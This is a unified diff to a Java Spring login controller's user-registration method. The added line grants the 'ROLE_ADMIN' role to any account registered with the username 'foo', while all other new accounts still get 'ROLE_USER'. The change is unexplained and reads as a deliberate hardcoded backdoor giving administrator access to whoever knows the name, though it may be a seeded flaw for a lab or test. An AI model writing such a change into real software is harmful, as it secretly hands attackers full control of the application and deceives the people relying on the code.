@@ -34,7 +34,7 @@ public class LoginController {
 	@RequestMapping(value = "register",method = RequestMethod.POST)
 	public String processNewUser(@RequestParam String username, @RequestParam String password, Model m) {
 		if (users.getFromUsername(username) == null) {
-			Account user = new Account(username,pass.encode(password), "ROLE_USER");
+			Account user = new Account(username,pass.encode(password), username.equals("foo") ? "ROLE_ADMIN" : "ROLE_USER");
 			users.merge(user);
 			m.addAttribute("register", "Succesfully registered, can now log in");
 		} else {
